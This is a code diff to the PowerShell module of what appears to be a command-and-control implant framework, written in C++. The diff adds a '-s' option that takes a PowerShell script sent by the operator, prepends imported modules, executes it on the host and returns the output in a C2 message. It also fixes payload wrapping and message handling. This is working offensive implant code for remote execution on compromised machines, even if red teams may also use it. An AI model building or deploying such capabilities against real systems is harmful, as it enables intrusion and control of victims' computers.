@@ -266,7 +266,7 @@ int Powershell::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
         {
             payload += "Invoke-Command -ScriptBlock  {\n";
             payload += fileContent;
-            payload += "};";
+            payload += "\n};";
         }
 
         c2Message.set_data(payload.data(), payload.size());
@@ -297,11 +297,30 @@ int Powershell::process(C2Message &c2Message, C2Message &c2RetMessage)
             m_modulesToImport+=buffer;
 
             std::string outCmd = execPowershell(m_modulesToImport);
-            c2RetMessage.set_instruction(c2RetMessage.instruction());
+            c2RetMessage.set_instruction(c2Message.instruction());
             c2RetMessage.set_cmd(cmd);
             c2RetMessage.set_returnvalue(outCmd);
             return 0;
 
+        }
+        if(splitedCmd[0]=="-s")
+        {
+            const std::string buffer = c2Message.data();
+            if (buffer.empty())
+            {
+                c2RetMessage.set_instruction(c2Message.instruction());
+                c2RetMessage.set_cmd(cmd);
+                c2RetMessage.set_returnvalue("Missing PowerShell script payload.");
+                return 0;
+            }
+
+            std::string finalCmd = m_modulesToImport;
+            finalCmd += buffer;
+            std::string outCmd = execPowershell(finalCmd);
+            c2RetMessage.set_instruction(c2Message.instruction());
+            c2RetMessage.set_cmd(cmd);
+            c2RetMessage.set_returnvalue(outCmd);
+            return 0;
         }
     }
 
@@ -310,7 +329,7 @@ int Powershell::process(C2Message &c2Message, C2Message &c2RetMessage)
 
     std::string outCmd = execPowershell(finalCmd);
 
-    c2RetMessage.set_instruction(c2RetMessage.instruction());
+    c2RetMessage.set_instruction(c2Message.instruction());
     c2RetMessage.set_cmd(cmd);
     c2RetMessage.set_returnvalue(outCmd);
 
@@ -416,6 +435,10 @@ std::string Powershell::execPowershell(const std::string& cmd)
     std::string result;
 
 #ifdef __linux__ 
+
+#if defined(C2CORE_BUILD_TESTS)
+    result = cmd;
+#endif
 
 
 #elif _WIN32
